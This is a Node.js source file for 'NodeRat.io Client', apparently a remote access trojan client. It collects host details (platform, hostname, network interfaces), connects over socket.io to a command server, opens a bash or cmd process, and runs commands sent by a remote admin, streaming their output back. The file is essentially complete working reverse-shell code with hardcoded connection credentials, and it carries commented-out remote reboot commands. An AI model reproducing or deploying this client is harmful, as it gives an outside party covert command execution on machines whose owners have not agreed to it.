///////////////////////////////////////////////////////////////////////
// Software: NodeRat.io CLient  (Reverse connexion)                  //
// Version:  v1.0.1                                                  //
// Date:     2017-02-01                                              //
// Author:   Maxime Westhoven                                        //
// Website:  https://www.mwesot.be/                                   //
// Licence:  Copyright © 2017-2018, All Rights Reserved.             //
///////////////////////////////////////////////////////////////////////

//CONFIG
var cloud_ip        = "http://127.0.0.1:8080/nodeClient";
var client_serial   = "000-000-000-001";
var client_key      = "03006512XcG3b8EMg9l1uU54ZUejzuog";
var cloud_password  = "123456";
var lastAdminId;

// DEPEDENCY
var nodeRatIo  = require("socket.io-client")(cloud_ip);
var exec       = require('child_process').exec;
var spawn      = require('child_process').spawn;
var os         = require('os');

// Information machine
var clientData = {}
clientData.platform = os.platform();
clientData.arch     = os.arch();
clientData.hostname = os.hostname();
clientData.network  = os.networkInterfaces();
clientData.version  = "1.0.0 (beta)";

// Init & Config shell
if (clientData.platform == "linux" || clientData.platform == "darwin") var init = "bash";
if (clientData.platform == "win32") var init = "cmd";
var spawn = spawn(init);
spawn.stdout.setEncoding("utf8");
spawn.stderr.setEncoding("utf8");

console.log('[SYSTEM] Client started.');

// =================================================== \\
// ====================SOCKET-IO====================== \\
// =================================================== \\

nodeRatIo.on("connect", function(socket){
	console.log("[SYSTEM] Client try connecte to cloud.");
	// Connexion au Cloud node
	nodeRatIo.emit("initNodeClient", {
		'client_serial'  : client_serial,
		'client_key'     : client_key,
		'cloud_password' : cloud_password
	});
});

nodeRatIo.on('clientInitSuccess',function(client_data){

	if(client_data.client_serial == client_serial && client_data.client_key == client_key)
	connected(client_data);

});

function connected(client_data){

	console.log("[SYSTEM] Client is connected to cloud.");
	nodeRatIo.emit('clientUpdateInfo', clientData);

	nodeRatIo.on('cmdForReverseShell',function(adminId, cmd){
		lastAdminId = adminId;
		spawn.stdin.write(cmd + "\n");
		console.log("[SYSTEM] Client reverse shell receive : " + cmd);
	});

	// =================================================== \\
	// ===================SHELL-EVENT===================== \\
	// =================================================== \\
	spawn.stdout.on('data', function (data) {
		//console.log('stdout: '+data);
		nodeRatIo.emit('reverseShellCallback', client_data.client_id, lastAdminId, "success", data);
	});

	spawn.stderr.on('data', function (data) {
		//console.log('stderr: '+data);
		nodeRatIo.emit('reverseShellCallback', client_data.client_id, lastAdminId, "error", data);
	});

	spawn.on('exit', function (exitCode) {
		//console.log("EXIT: " + exitCode);
	});

}

// =================================================== \\
// ===================SOCKET-EVENT==================== \\
// =================================================== \\
nodeRatIo.on('ping',function(){
	//console.log("PING");
});

nodeRatIo.on('pong',function(){
	//console.log("PONG");
});

nodeRatIo.on('reconnect',function(){
	//console.log("RECONNECT");
});

nodeRatIo.on('reconnecting',function(Number ){
	//console.log("RECONNECTING: ", Number );
});

nodeRatIo.on("disconnect",function(){
	//console.log("DISCONNECT");
	//1exec('pm2 restart 0');
});

nodeRatIo.on("client_reboot_server",function(){
	//console.log("client_reboot_server from admin");
	//exec('pm2 restart 0');
});

nodeRatIo.on("client_reboot_system",function(){
	//console.log("client_reboot_system from admin");
	//exec('reboot');
});
